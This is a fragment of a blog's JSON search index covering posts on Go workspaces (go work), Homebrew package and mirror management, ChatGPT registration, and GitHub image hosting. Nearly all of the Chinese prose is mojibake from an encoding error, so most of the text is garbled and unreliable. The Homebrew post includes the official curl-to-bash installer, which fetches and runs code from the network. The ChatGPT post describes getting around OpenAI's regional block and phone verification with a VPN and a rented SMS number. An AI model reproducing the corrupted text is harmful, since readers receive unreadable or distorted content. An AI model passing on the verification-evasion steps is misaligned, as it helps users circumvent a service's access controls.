æ—¶ï¼Œéƒ½ä¸å¾—ä¸åˆ é™¤æ‰ go.modä¸­çš„replaceæ‰èƒ½ä½¿æ¨¡å—ç¨³å®šçš„å‘å¸ƒã€‚\nåœ¨go 1.18åï¼Œå®˜æ–¹æä¾›äº†å¤šæ¨¡å—å·¥ä½œåŒºåŠŸèƒ½ï¼Œå³go workã€‚\n1. ä½¿ç”¨æ¡ä»¶ éœ€è¦go 1.18æˆ–æ›´é«˜ç‰ˆæœ¬ # æŸ¥çœ‹ go ç‰ˆæœ¬ $ go version go version go1.18 darwin/amd64 2.go workæ”¯æŒå‘½ä»¤ é€šå¸¸æƒ…å†µä¸‹ï¼Œå»ºè®®ä¸è¦æäº¤go.workæ–‡ä»¶åˆ°git ä¸Šï¼Œå®ƒä¸»è¦ç”¨äºæœ¬åœ°ä»£ç å¼€å‘ ç”Ÿæˆgo.workæ–‡ä»¶ï¼šæ¨èåœ¨$GOPATHè·¯å¾„ä¸‹æ‰§è¡Œ æ³¨æ„ï¼šè‹¥ä½ çš„å¼€å‘ç©ºé—´ä¸åœ¨$GOPATHä¸‹ï¼Œåˆ™åœ¨ä½ çš„å®é™…workspaceæ ¹ç›®å½•ä¸‹æ‰§è¡Œåˆå§‹åŒ– initå·¥ä½œåŒºæ–‡ä»¶ï¼š\n# æŸ¥çœ‹æˆ‘çš„ GOPATH $ go env | grep GOPATH GOPATH=\u0026#34;/Users/xxx/go\u0026#34; # æŸ¥çœ‹æˆ‘çš„æŸä¸ª workspace go $ pwd /Users/xxx/gitHub/lian/go go $ go work init # åˆå§‹åŒ–ï¼Œç”Ÿæˆ go.workå·¥ä½œåŒºæ–‡ä»¶ go $ tree ã€é»„è‰²ã€‘æ ‡è¯†go-gin-webæ˜¯åœ¨goè¿™ä¸ªå½“å‰workspaceä¸‹çš„ä¸€ä¸ªé¡¹ç›®ï¼ŒåŒçº§çš„è¿˜æœ‰å¦å¤–ä¸€ä¸ªé¡¹ç›®go-grammar\nã€çº¢è‰²ã€‘æ ‡è¯†å†…çš„go.workå’Œgo.work.sumæ˜¯æˆ‘ä»¬initåï¼Œå†™å…¥çš„åˆå§‹åŒ–å·¥ä½œåŒºæ–‡ä»¶ã€‚äºŒè€…åœ¨workspaceæ ¹ç›®å½•ï¼Œä¸go-gin-webåŒçº§ã€‚\næ·»åŠ æ–°çš„æ¨¡å—åˆ°å·¥ä½œåŒºï¼šgo work use $ go work use ./example # æ·»åŠ ä¸€ä¸ªæ¨¡å—åˆ°å·¥ä½œåŒº $ go work use ./example ./example1 # æ·»åŠ å¤šä¸ªæ¨¡å—åˆ°å·¥ä½œåŒº $ go work use -r ./example # é€’å½’ ./example ç›®å½•åˆ°å½“å‰å·¥ä½œåŒº # åˆ é™¤å‘½ä»¤ $ go work edit -dropuse=./example # æŸ¥çœ‹å½“å‰å·¥ä½œåŒºæ–‡ä»¶è·¯å¾„ï¼Œæ’æŸ¥å·¥ä½œåŒºæ–‡ä»¶æ˜¯å¦è®¾ç½®æ­£ç¡® $ go env GOWORK /Users/xxx/gitHub/lian/go/go.work 3.go.workæ–‡ä»¶ç»“æ„ å’Œgo.modæ–‡ä»¶ç»“æ„ç±»ä¼¼ï¼Œæ”¯æŒGoç‰ˆæœ¬å·ã€æŒ‡å®šå·¥ä½œåŒºå’Œéœ€è¦æ›¿æ¢çš„ä»“åº“ æ–‡ä»¶ç»“æ„ç¤ºä¾‹: å‚è€ƒ Go 1.18 æ–°ç‰¹æ€§å¤šæ¨¡å—å·¥ä½œåŒºæ•™ç¨‹-è®©å¤šæ¨¡å—å¼€å‘å˜å¾—ç®€å• | Goè¯­è¨€ä¸­æ–‡ç½‘ Go å¤šæ¨¡å—å·¥ä½œåŒºæ–‡æ¡£ã€ä»£ç ç¤ºä¾‹è·å–åœ°å€ | GitHub æœ€åï¼Œ å¸Œæœ›å¤§å®¶æ—©æ—¥å®ç°ï¼šæˆä¸ºç¼–ç¨‹é«˜æ‰‹çš„ä¼Ÿå¤§æ¢¦æƒ³ï¼ æ¬¢è¿äº¤æµ~\næœ¬æ–‡ç‰ˆæƒå½’åŸä½œè€…æ›œçµæ‰€æœ‰ï¼æœªç»å…è®¸ï¼Œä¸¥ç¦è½¬è½½ï¼å¯¹éæ³•è½¬è½½è€…, åŸä½œè€…ä¿ç•™é‡‡ç”¨æ³•å¾‹æ‰‹æ®µè¿½ç©¶çš„æƒåˆ©ï¼ è‹¥éœ€è½¬è½½ï¼Œè¯·è”ç³»å¾®ä¿¡å…¬ä¼—å·ï¼šè¿å…ˆç”Ÿæœ‰çŒ«ç—…ï¼Œå¯è·å–ä½œè€…è”ç³»æ–¹å¼ï¼\n","permalink":"https://lianpf.github.io/posts/backend-develop/go-work/","summary":"\u003cp\u003ego ä½¿ç”¨å¤šæ¨¡å—å·¥ä½œåŒºï¼Œè®©å¼€å‘è€…å¯åŒæ—¶å¤„ç†å¤šä¸ªæ¨¡å—çš„\u0026hellip;\u003c/p\u003e","title":"Go: å¤šæ¨¡å—å·¥ä½œåŒº go work"},{"content":"Homebrewæ˜¯ä½¿ç”¨ Mac OS çš„ä¸€ä»¶åˆ©å™¨ï¼ŒHomebrewå¯ä»¥å®‰è£… Appleæ²¡æœ‰é¢„è£…ä½†éå¸¸\u0026hellip;\nä¸€ã€Homebrewçš„ç®¡ç† 1.brewå®‰è£…æ›´æ–° Homebrewå®˜ç½‘\nHomebrewæ˜¯ä½¿ç”¨ Mac OS çš„ä¸€ä»¶åˆ©å™¨ï¼ŒHomebrewå¯ä»¥å®‰è£… Appleæ²¡æœ‰é¢„è£…ä½†éå¸¸éœ€è¦çš„ä¸œè¥¿ã€‚Homebrew ä¼šå°†è½¯ä»¶åŒ…å®‰è£…åˆ°ç‹¬ç«‹ç›®å½•ï¼Œå¹¶å°†å…¶æ–‡ä»¶è½¯é“¾æ¥è‡³/usr/local\nå®‰è£…æŒ‡ä»¤:\n$ /bin/bash -c \u0026#34;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)\u0026#34; Homebrewç®¡ç†ï¼š\n$ brew --version $ brew update # æ›´æ–° Homebrew è‡ªå·± $ brew update-reset # æ›´æ–°é‡ç½® 2.é•œåƒæºå’Œä»£ç† Homebrew å®‰è£…é€Ÿåº¦è¾ƒæ…¢ï¼Œå¯èƒ½çš„é—®é¢˜æ˜¯ï¼š\né•œåƒ: Homebrewé»˜è®¤è½¯ä»¶æºï¼Œå› ä¸ºåœ°åŒºæˆ–ç½‘ç»œç¯å¢ƒä¸‹é€Ÿåº¦è¾ƒæ…¢ ä»£ç† 2.1 æ›´æ¢è½¯ä»¶æº æŸ¥çœ‹å½“å‰çš„é•œåƒæº $ brew config # æŸ¥çœ‹ Homebrew çš„é•œåƒæºé…ç½® # è¾“å‡ºç»“æœä¸­å¯çœ‹åˆ°ä¸¤ä¸ªé…ç½®é¡¹: è¡¨ç¤º Homebrew çš„ Git è¿œç¨‹ä»“åº“æºé“¾æ¥ï¼Œç”¨äºä¸‹è½½è½¯ä»¶åŒ…å’Œæ›´æ–° # ORIGIN: https://github.com/Homebrew/brew.git # Core tap origin: https://github.com/Homebrew/homebrew-core å°è¯•åˆ‡æ¢åˆ°å…¶ä»–é•œåƒæºï¼Œå¦‚æ¸…åå¤§å­¦ã€ä¸­ç§‘å¤§ç­‰æä¾›çš„é•œåƒæºã€‚ä»¥ä¸‹æ˜¯åˆ‡æ¢é•œåƒæºçš„æ­¥éª¤ï¼š\nI. æ‰“å¼€ç»ˆç«¯åº”ç”¨ç¨‹åº II. è¿è¡Œä»¥ä¸‹å‘½ä»¤æ›¿æ¢Homebrewé»˜è®¤çš„é•œåƒæº å›½å†…é•œåƒåœ°å€:\nç§‘å¤§: https://mirrors.ustc.edu.cn é˜¿é‡Œ: https://mirrors.aliyun.com/homebrew åä¸º: https://mirrors.huaweicloud.com/homebrew å®˜æ–¹: https://github.com/Homebrew Homebrewçš„é…ç½®åˆ†æˆä¸‰ä¸ªç›®å½•ï¼Œåˆ†åˆ«æ˜¯:\nbrewï¼ˆbrew --repoï¼‰: ä¸»è¦é…ç½®ç›®å½•ï¼Œç”¨äºå­˜å‚¨ Homebrew çš„æ ¸å¿ƒåº“å’Œå·¥å…·ã€‚ é»˜è®¤ä½ç½®ï¼š/usr/local/Homebrewï¼ˆå¯¹äº macOS ç³»ç»Ÿï¼‰ homebrew/coreï¼ˆbrew --repo homebrew/coreï¼‰: å­˜å‚¨ Homebrew Core çš„è½¯ä»¶åŒ…ä¿¡æ¯å’Œå…¬å¼ï¼ˆFormulaï¼‰ï¼Œå®ƒåŒ…å«äº†å¤§é‡å¸¸è§çš„å¼€æºè½¯ä»¶åŒ…ï¼Œå¦‚å¸¸ç”¨çš„å‘½ä»¤è¡Œå·¥å…·å’Œå®ç”¨ç¨‹åº é»˜è®¤ä½ç½®ï¼š/usr/local/Homebrew/Library/Taps/homebrew/homebrew-core homebrew/caskï¼ˆbrew --repo homebrew/caskï¼‰: å­˜å‚¨ Homebrew Cask çš„åº”ç”¨ç¨‹åºä¿¡æ¯å’Œ Cask æ–‡ä»¶ é»˜è®¤ä½ç½®ï¼š/usr/local/Homebrew/Library/Taps/homebrew/homebrew-cask # é€šè¿‡git remote get-url originæ¥æŸ¥çœ‹å½“å‰çš„æºçš„URL $ git -C \u0026#34;$(brew --repo)\u0026#34; remote get-url origin # è¾“å‡º: https://github.com/Homebrew/brew.git $ git -C \u0026#34;$(brew --repo homebrew/core)\u0026#34; remote get-url origin $ git -C \u0026#34;$(brew --repo homebrew/cask)\u0026#34; remote get-url origin # 1.é€šè¿‡ä»¥ä¸‹ä¸‰ä¸ªå‘½ä»¤ä¿®æ”¹Homebrewæºé…ç½®ä¸ºé»˜è®¤å€¼ï¼Œ2.æ›´æ–° $ git -C \u0026#34;$(brew --repo)\u0026#34; remote set-url origin \u0026#39;https://mirrors.ustc.edu.cn/brew.git\u0026#39; $ git -C \u0026#34;$(brew --repo homebrew/core)\u0026#34; remote set-url origin \u0026#39;https://mirrors.ustc.edu.cn/homebrew-core.git\u0026#39; # å¯å¿½ç•¥: homebrew/cask éå¿…è¦å¯ä¸æ›¿æ¢ # $ git -C \u0026#34;$(brew --repo homebrew/cask)\u0026#34; remote set-url origin \u0026#39;https://mirrors.ustc.edu.cn/homebrew-cask.git\u0026#39; $ brew update # æ›´æ–° ç¬¬äºŒç§æ›´æ¢é•œåƒæºçš„æ–¹å¼: ç¼–è¾‘~/.bash_profileæ–‡ä»¶\n# bash æ›¿æ¢ brew bintray é•œåƒ $ echo \u0026#39;export HOMEBREW_BOTTLE_DOMAIN=https://mirrors.ustc.edu.cn/homebrew-bottles\u0026#39; \u0026gt;\u0026gt; ~/.bash_profile $ source ~/.bash_profile # åˆ·æ–°æº(æ‰§è¡Œæ”¹æ¡æ—¶,æ‰§è¡Œæ—¶é—´å¯èƒ½æ¯”è¾ƒé•¿,è¯·è€å¿ƒç­‰å¾…) $ brew update 2.2 ä»£ç†æœåŠ¡å™¨ å¦‚æœåœ¨è®¿é—®å¤–éƒ¨ç½‘ç»œæ—¶éœ€è¦ä»£ç†æœåŠ¡å™¨ï¼Œå¯åœ¨ç»ˆç«¯ä¸­é…ç½®ç›¸åº”çš„ä»£ç†è®¾ç½®ï¼Œä»¥åŠ é€Ÿ Homebrew çš„å®‰è£…ã€‚\n# ä½¿ç”¨ `export` å‘½ä»¤è®¾ç½® `http_proxy` å’Œ `https_proxy` ç¯å¢ƒå˜é‡ï¼Œå°†ä»£ç†æœåŠ¡å™¨çš„åœ°å€å’Œç«¯å£é…ç½®ä¸ºåˆé€‚çš„å€¼ export http_proxy=http://proxy.example.com:8888 export https_proxy=http://proxy.example.com:8888 è¯·å°† proxy.example.com æ›¿æ¢ä¸ºä½ å®é™…çš„ä»£ç†æœåŠ¡å™¨åœ°å€å’Œç«¯å£ã€‚\näºŒã€åŒ…çš„ç®¡ç† 1.åŒ…çš„æ›´æ–° ä¸€å‘³åœ°æ›´æ–°Homebrewæ‰€æœ‰å®‰è£…åŒ…å¯èƒ½å¸¦æ¥ä¾èµ–çš„ä¸æ”¯æŒï¼Œå»ºè®®æ¯ä¸ªæœˆå®šæœŸæŸ¥çœ‹ä¸€ä¸‹ï¼Œæœ‰é€‰æ‹©æ€§åœ°æ›´æ–°ã€‚\n# åˆ—å‡ºå·²å®‰è£…åŒ… $ brew list # å®‰è£…åŒ… $ brew search \u0026lt;package name\u0026gt; # brew search goï¼šæŸ¥æ‰¾goçš„æ‰€æœ‰ç‰ˆæœ¬ # å®‰è£…æŒ‡å®šåŒ…åŠå…¶ç‰ˆæœ¬ï¼šbrew install $FORMULA / brew install go@1.17 $ brew install \u0026lt;package name[@version]\u0026gt; $ brew uninstall \u0026lt;package name[@version]\u0026gt; # æ›´æ–° brew update â€”â€” é€‚ç”¨äºæ›´æ–°é•œåƒæºå $ brew update # æ›´æ–° Homebrew è‡ªèº«å’Œ Homebrew Coreï¼ˆå‘½ä»¤è¡Œè½¯ä»¶åŒ…ï¼‰çš„ä¿¡æ¯ï¼Œè€Œä¸ä¼šæ›´æ–°å·²å®‰è£…çš„è½¯ä»¶åŒ… # æ›´æ–° $ brew outdated # æŸ¥çœ‹å“ªäº›å®‰è£…åŒ…éœ€è¦æ›´æ–° $ brew upgrade # æ›´æ–°â€å·²å®‰è£…çš„â€œæ‰€æœ‰åŒ… $ brew upgrade $FORMULA # æ›´æ–°â€å·²å®‰è£…çš„â€œæŒ‡å®šåŒ… # åˆ é™¤ $ brew rm $FORMULA # åˆ é™¤æŸä¸ªåŒ… $ brew uninstall --force $FORMULA # åˆ é™¤æ‰€æœ‰ç‰ˆæœ¬ # æ¸…ç†æ—§ç‰ˆæœ¬ $ brew cleanup # æ¸…ç†æ‰€æœ‰åŒ…çš„æ—§ç‰ˆæœ¬ $ brew cleanup $FORMULA # æ¸…ç†æŒ‡å®šåŒ…çš„æ—§ç‰ˆæœ¬ $ brew cleanup -n # æŸ¥çœ‹å¯æ¸…ç†çš„æ—§ç‰ˆæœ¬åŒ…ï¼Œä¸æ‰§è¡Œå®é™…æ“ä½œ # é”å®šä¸æƒ³æ›´æ–°çš„åŒ… $ brew pin $FORMULA # é”å®šæŸä¸ªåŒ… $ brew unpin $FORMULA # å–æ¶ˆé”å®š # æŸ¥çœ‹å®‰è£…åŒ…çš„ç›¸å…³ä¿¡æ¯ $ brew info $FORMULA # æ˜¾ç¤ºæŸä¸ªåŒ…çš„ä¿¡æ¯ $ brew info # æ˜¾ç¤ºå®‰è£…äº†åŒ…æ•°é‡ï¼Œæ–‡ä»¶æ•°é‡ï¼Œå’Œæ€»å ç”¨ç©ºé—´ $ brew deps --installed --tree # æŸ¥çœ‹å·²å®‰è£…çš„åŒ…çš„ä¾èµ–ï¼Œæ ‘å½¢æ˜¾ç¤º 2.åŒ…ï¼ˆé•œåƒæºï¼‰å¼‚å¸¸ ç‰¹åˆ«é€‚ç”¨äºåˆ‡æ¢é•œåƒæºåï¼Œæˆ–å…¶ä»–æƒ…å†µä¸‹çªç„¶æ‹‰å–åŒ…å¤±è´¥\n# ä¾æ¬¡å°è¯•ä»¥ä¸‹å‘½ä»¤ $ brew doctor $ brew update-reset $ brew update ä¸‰ã€å¸¸è§é—®é¢˜ 1.Version value must be a string è§£å†³ï¼š\n$ brew update-reset # æ›´æ–°é‡ç½® $ brew update # æ›´æ–° 2.åˆ‡æ¢é•œåƒæºæŠ¥é”™: cannot change to '/usr/local/Homebrew/Library/Taps/homebrew/homebrew-cask': No such file or directory ä½¿ç”¨å‘½ä»¤$ git -C \u0026quot;$(brew --repo homebrew/cask)\u0026quot; remote set-url origin 'https://mirrors.ustc.edu.cn/homebrew-cask.git' æŠ¥é”™ï¼Œå¯èƒ½æ˜¯å› ä¸º Homebrew Cask æœªå®‰è£…æˆ–å®‰è£…ä½ç½®ä¸åœ¨é¢„æœŸçš„ç›®å½•ä¸­å¯¼è‡´çš„ã€‚\nè§£å†³:\n# ç¬¬1æ­¥: æ£€æŸ¥ç›®å½• # æ£€æŸ¥ç›®å½•æ˜¯å¦å­˜åœ¨ $ ls /usr/local/Homebrew/Library/Taps/homebrew/ # ç¡®ä¿è¯¥å‘½ä»¤åï¼Œå­˜åœ¨\u0026#39;homebrew-cask\u0026#39; # \u0026#39;homebrew-cask\u0026#39;ä¸å­˜åœ¨ï¼Œéœ€é‡æ–°æ·»åŠ  $ brew tap homebrew/cask # ç¬¬2æ­¥: æ›´æ–° $ brew update $ brew upgrade å‚è€ƒ Homebrew å®‰è£…ã€ä½¿ç”¨ã€å‡çº§å’Œå¸è½½ æœ€åï¼Œ å¸Œæœ›å¤§å®¶æ—©æ—¥å®ç°ï¼šæˆä¸ºç¼–ç¨‹é«˜æ‰‹çš„ä¼Ÿå¤§æ¢¦æƒ³ï¼ æ¬¢è¿äº¤æµ~\næœ¬æ–‡ç‰ˆæƒå½’åŸä½œè€…æ›œçµæ‰€æœ‰ï¼æœªç»å…è®¸ï¼Œä¸¥ç¦è½¬è½½ï¼å¯¹éæ³•è½¬è½½è€…, åŸä½œè€…ä¿ç•™é‡‡ç”¨æ³•å¾‹æ‰‹æ®µè¿½ç©¶çš„æƒåˆ©ï¼ è‹¥éœ€è½¬è½½ï¼Œè¯·è”ç³»å¾®ä¿¡å…¬ä¼—å·ï¼šè¿å…ˆç”Ÿæœ‰çŒ«ç—…ï¼Œå¯è·å–ä½œè€…è”ç³»æ–¹å¼ï¼\n","permalink":"https://lianpf.github.io/posts/other/mac-homebrew/","summary":"\u003cp\u003e\u003ccode\u003eHomebrew\u003c/code\u003eæ˜¯ä½¿ç”¨ Mac OS çš„ä¸€ä»¶åˆ©å™¨ï¼Œ\u003ccode\u003eHomebrew\u003c/code\u003eå¯ä»¥å®‰è£… \u003ccode\u003eApple\u003c/code\u003eæ²¡æœ‰é¢„è£…ä½†éå¸¸\u0026hellip;\u003c/p\u003e","title":"å·¥å…·: Homebrew"},{"content":"ä»æ˜¥èŠ‚å‰å°±å¼€å§‹é…é…¿çš„ChatGPTæœ€è¿‘å¤§ç«ï¼Œæ¥ä¸‹æ¥å°±ç»™å¤§å®¶æ¢³ç†ä¸€ä¸‹æ³¨å†Œçš„è¿‡ç¨‹\u0026hellip;\nä¸€ã€æ³¨å†Œä½¿ç”¨ 1ã€ç§‘å­¦ä¸Šç½‘ èŠ‚ç‚¹éœ€è¦ã€å›½å¤–ã€‘ï¼Œä¸èƒ½é€‰æ‹©é¦™æ¸¯å’Œå°æ¹¾ã€‚å…è´¹çš„ç§‘å­¦ä¸Šç½‘æ•™ç¨‹ã€‚\næœ‰æ¡ä»¶çš„ï¼Œè¿˜æ˜¯å°½é‡ä½¿ç”¨è‡ªå·±çš„ç¨³å®šVPNã€‚\n2ã€chatGPTè´¦å·æ³¨å†Œ æ‰“å¼€ å®˜ç½‘æ³¨å†Œ ä½¿ç”¨å›½å¤–é‚®ç®±æ³¨å†ŒchatGPTè´¦å·ï¼Œä¾æ¬¡è¾“å…¥é‚®ç®±å’Œå¯†ç ã€‚ å¦‚gmailã€outlookã€iCloudé‚®ç®±ç­‰ï¼Œå»ºè®®ä½¿ç”¨ã€Googleé‚®ç®±ã€‘ 3ã€æ³¨å†ŒæˆåŠŸï¼ŒéªŒè¯chatGPTè´¦å· â€”â€” çŸ­ä¿¡æ¥ç å¹³å° æ³¨å†ŒæˆåŠŸåä¼šè¿›å…¥ã€éªŒè¯æ‰‹æœºå·ã€‘é¡µé¢ï¼Œé€‰æ‹©ä½ ã€ä¸‹ä¸€æ­¥çŸ­ä¿¡å¹³å°çš„æ¥ç çš„æ‰‹æœºå›½å®¶ã€‘ å»ºè®®ä¸è¦é€‰æ‹©å°åº¦æˆ–å°å°¼ç­‰ä¸œå—äºšåœ°åŒºï¼Œæœ‰æ—¶å€™ä¼šæ¥æ”¶ä¸åˆ°éªŒè¯ç ã€‚å¾·æ³•ç­‰å›½å®¶è™½ç„¶ä»·æ ¼ç¨è´µï¼Œä½†ç›¸å¯¹ç¨³å®šã€‚\næ³¨å†Œ sms-activateï¼ˆçŸ­ä¿¡æ¥ç å¹³å°ï¼‰ï¼Œå¹¶è¿›è¡Œè´¦å·å……å€¼ã€‚ å»ºè®®é€‰æ‹©ã€æ”¯ä»˜å®ã€‘æ–¹å¼å……å€¼ã€1ç¾å…ƒã€‘ï¼Œæ”¯ä»˜å®Œæˆå¯èƒ½è¦ç­‰å‡ åˆ†é’Ÿæ‰æ˜¾ç¤ºåˆ°ä½™é¢è´¦æˆ·ï¼Œæˆ‘åœ¨æ³¨å†Œæ—¶ä¹Ÿæ˜¯ç­‰äº†ä¸€ä¼šæ‰æ˜¾ç¤ºä½™é¢ã€‚\nçŸ­ä¿¡æ¥ç å¹³å°ï¼Œå·¦ä¾§æœç´¢æˆ–ç›´æ¥ç‚¹å‡»OpenAIæ ‡è¯†ï¼Œé€‰æ‹©å¯¹åº”å›½å®¶æˆ–åœ°åŒºã€‚ å›¾ä¸‹919862209703å°±æ˜¯ä½ å¯ä»¥æ¥ç çš„å·ç ï¼Œå¤åˆ¶å·ç åˆ°OpenAIéªŒè¯ç ç•Œé¢\nå¦‚æœæ²¡æœ‰æ”¶åˆ°éªŒè¯ç ï¼Œä½ å¯ä»¥å¤šè¯•å‡ æ¬¡ï¼Œæ²¡æ”¶åˆ°ç å¯ä»¥åœ¨æœ‰æ•ˆæœŸå†…å…è´¹é€€ä¸€æ¬¡ã€‚\nè¾“å…¥æ¥ç å·ç ï¼Œç‚¹å‡»ã€send codeã€‘ã€‚\næ³¨å†Œå®Œå°±å¯ä»¥å»ç™»å½• https://chat.openai.com/auth/login\näºŒã€æ³¨æ„äº‹é¡¹ 1.éªŒè¯ç å¹³å° æ³¨æ„è¦é€‰å¥½å¯¹åº”çš„å›½å®¶ã€‚ä¾‹å¦‚ä½ è·å–çš„æ˜¯å°åº¦ï¼Œåœ¨chatGPTå¡«å†™çš„æ—¶å€™ï¼Œè¦é€‰æ‹©å°åº¦ å¡«å†™æ‰‹æœºå·ï¼Œç›´æ¥å¤åˆ¶ã€æ¥ç å¹³å°ã€‘æä¾›çš„æ‰‹æœºå·ã€‚è‹¥ä¸èƒ½æ­£å¸¸æ¥ç ï¼Œåˆ™å°è¯•å»é™¤ã€å¤åˆ¶çš„å·ç ä¸­ã€‘é‡å¤çš„å›½å®¶åŒºå· æ¥ç æ‰‹æœºçš„å›½å®¶å°½é‡ä¸è¦é€‰æ‹©å°åº¦ç­‰ä¸œå—äºšåœ°åŒºï¼Œæœ‰æ—¶å€™ä¼šæ¥æ”¶ä¸åˆ°éªŒè¯ç  2.ChatGPT - OpenAIè´¦å·æ³¨å†Œ é€‰æ‹©å›½å¤–çš„èŠ‚ç‚¹IPï¼Œä¸èƒ½é€‰æ‹©é¦™æ¸¯å’Œå°æ¹¾ æ‰“å¼€å…¨å±€æ¨¡å¼ï¼Œä¸è¦ä½¿ç”¨Pacæ¨¡å¼ã€‚å¦åˆ™Chromeå®¹æ˜“è¢«æ ‡è®°ä¸ºå›½å†…ï¼Œå›½å†…å¹¶ä¸æ”¯æŒOpenAIè´¦å·æ³¨å†Œï¼Œæç¤ºï¼šOpenAI's services are not available in your country. ä½œä¸ºå¯¹ä¸Šä¸€æ¡çš„è¡¥å……ï¼Œã€æ³¨å†Œã€‘è¿‡ç¨‹å»ºè®®ä½¿ç”¨ã€æ— ç—•æ¨¡å¼ã€‘ã€‚ æ‹“å±•å†…å®¹ ChatGPTä½¿ç”¨ç¤ºä¾‹ å¦‚ä½•ç¼–ç¨‹è°ƒç”¨OpenAIçš„ChatGPT APIæ¥å£ æœ€åï¼Œ å¸Œæœ›å¤§å®¶æ—©æ—¥å®ç°ï¼šæˆä¸ºç¼–ç¨‹é«˜æ‰‹çš„ä¼Ÿå¤§æ¢¦æƒ³ï¼ æ¬¢è¿äº¤æµ~\næœ¬æ–‡ç‰ˆæƒå½’åŸä½œè€…æ›œçµæ‰€æœ‰ï¼æœªç»å…è®¸ï¼Œä¸¥ç¦è½¬è½½ï¼å¯¹éæ³•è½¬è½½è€…, åŸä½œè€…ä¿ç•™é‡‡ç”¨æ³•å¾‹æ‰‹æ®µè¿½ç©¶çš„æƒåˆ©ï¼ è‹¥éœ€è½¬è½½ï¼Œè¯·è”ç³»å¾®ä¿¡å…¬ä¼—å·ï¼šè¿å…ˆç”Ÿæœ‰çŒ«ç—…ï¼Œå¯è·å–ä½œè€…è”ç³»æ–¹å¼ï¼\n","permalink":"https://lianpf.github.io/posts/other/chatgpt-registeranduse/","summary":"\u003cp\u003eä»æ˜¥èŠ‚å‰å°±å¼€å§‹é…é…¿çš„\u003ccode\u003eChatGPT\u003c/code\u003eæœ€è¿‘å¤§ç«ï¼Œæ¥ä¸‹æ¥å°±ç»™å¤§å®¶æ¢³ç†ä¸€ä¸‹æ³¨å†Œçš„è¿‡ç¨‹\u0026hellip;\u003c/p\u003e","title":"ChatGPTï¼ˆOpenAIï¼‰æ³¨å†ŒåŠä½¿ç”¨"},{"content":"å¯¹äºç»å¸¸å†™ä½œè®°å½•çš„åŒå­¦ï¼Œå›¾åºŠéå¸¸èˆ’æœï¼Œä¸ä»…å¯ä»¥èŠ‚çœå†™ä½œå¯¼å…¥å›¾ç‰‡çš„æ—¶é—´ï¼ŒåŒæ—¶ä¿éšœåšå¥½ä¸€å¼ å›¾çš„æƒ…å†µä¸‹åœ¨å¤šä¸ªæ–‡æ¡£åœºæ™¯ä½¿ç”¨\u0026hellip;\nå‡ å¹´äº²èº«ä½“éªŒå‘Šè¯‰å¤§å®¶ï¼ŒGithubåšå›¾åºŠååˆ†é è°±ï¼Œæœ‰CDNåŠ é€Ÿè®¿é—®å·¨å¿«ï¼Œä»Šå¤©æœ‰æ—¶é—´æŠŠæµç¨‹æ•´ç†å‡ºæ¥ã€‚\nå»ºè®®ä½¿ç”¨Githubæ›¿æ¢Giteeï¼Œä¸€æ˜¯Giteeå—é™äºå„ç§åŸå› ï¼Œç»å¸¸ä¼šåœ¨ä½ ä½¿ç”¨ä¸­å‡ºç°å„ç§å¹ºè›¾å­ï¼Œä½ ä¸å¾—ä¸è¡¥å……å„ç§èµ„æ–™ã€‚äºŒæ˜¯Githubæä¾›äº†CDNåŠ é€Ÿï¼Œæ‰€ä»¥Giteeåœ¨å›½å†…è®¿é—®è¾ƒå¿«çš„ä¼˜åŠ¿ä¹Ÿå¤±å»äº†ã€‚\nä¸€ã€ä½¿ç”¨GitHubæ­å»ºå›¾åºŠ 1.å‰ææ¡ä»¶: å›¾åºŠä»“åº“ å³ä¸Šè§’çš„â€åŠ å·â€œç‚¹å‡»ã€New repositoryã€æ–°å»ºä¸€ä¸ªä»“åº“ ä»“åº“å¿…é¡»æ˜¯publicçš„ï¼Œå¦åˆ™å­˜å‚¨çš„å›¾ç‰‡ä¸èƒ½æ­£å¸¸è®¿é—® 2.è®¾ç½®Personal access tokens è‹¥ä½ ä¸éœ€è¦ä½¿ç”¨picGoç­‰å›¾ç‰‡ç®¡ç†å·¥å…·ï¼Œä¸Šä¼ ç®¡ç†å›¾ç‰‡ã€‚åˆ™æ­¤æ­¥éª¤å¯ä»¥å¿½ç•¥ã€‚\nè¿™é‡Œé€‰æ‹©åˆ›å»ºpersonal access token (classic)ï¼Œè¯¦æƒ…å‚è€ƒ åˆ›å»ºä¸ªäººè®¿é—®ä»¤ç‰Œ - GitHub Docsã€‚\nä¾æ¬¡é…ç½®:\nNoteï¼šç»™ä»¤ç‰Œä¸€ä¸ªæè¿°æ€§åç§° Expirationï¼šä»¤ç‰Œæä¾›åˆ°æœŸæ—¶é—´ repoï¼šè¦æˆäºˆæ­¤ä»¤ç‰Œçš„ä½œç”¨åŸŸ æ³¨æ„ï¼Œç”Ÿæˆçš„tokenåªä¼šåœ¨è¿™é‡Œæ˜¾ç¤ºä¸€æ¬¡ï¼Œæ‰€ä»¥è®°å¾—å•ç‹¬ä¿å­˜ä¸‹æ¥å“¦ è‡³æ­¤ï¼ŒGithubçš„é…ç½®å®Œæˆã€‚\näºŒã€å¿«é€Ÿä¸Šä¼ å›¾ç‰‡åŠå¦‚ä½•ä½¿ç”¨ 1.PicGoå¿«é€Ÿä¸Šä¼ å›¾ç‰‡ è‹¥ä½ ä¸éœ€è¦ä½¿ç”¨picGoç­‰å›¾ç‰‡ç®¡ç†å·¥å…·ï¼Œä¸Šä¼ ç®¡ç†å›¾ç‰‡ã€‚åˆ™æ­¤æ­¥éª¤å¯ä»¥å¿½ç•¥ã€‚\nç”±äºå›½å†…ä¸‹è½½PicGoé€Ÿåº¦éå¸¸æ…¢ï¼Œç»™å¤§å®¶æ¨èä¸€ä¸ªé•œåƒåœ°å€ä¸‹è½½ã€‚\nè¿™ä¸ªä¸‹è½½åœ°å€è¦æ‰“å¼€vpnè®¿é—®ã€‚ä¸‹è½½åœ°å€ï¼šIndex of /github-release/Molunerfinn_PicGo/v2.3.0/ (sdu.edu.cn)ã€‚\nå¦‚æˆ‘ä½¿ç”¨çš„æ˜¯Mac64ä½ç³»ç»Ÿï¼Œå¯é€šè¿‡uname -aå‘½ä»¤æŸ¥çœ‹ã€‚ ç‚¹å‡» PicGo-2.3.1-x64.dmg æŸ¥çœ‹\né€‰æ‹©å¯¹åº”çš„ç‰ˆæœ¬ï¼Œå³å¯ä¸‹è½½å®‰è£…ã€‚\nMacé€‰æ‹©ç‰ˆæœ¬ç–‘é—®å‚è€ƒï¼šMacç”µè„‘ä½¿ç”¨ï¼šåˆ¤æ–­ARM64 or x64çš„æ–¹æ³•\né…ç½®PicGo:\nä»“åº“åï¼š[githubç”¨æˆ·å]/[ç¬¬ä¸€æ­¥æ–°å»ºçš„ä»“åº“åç§°] 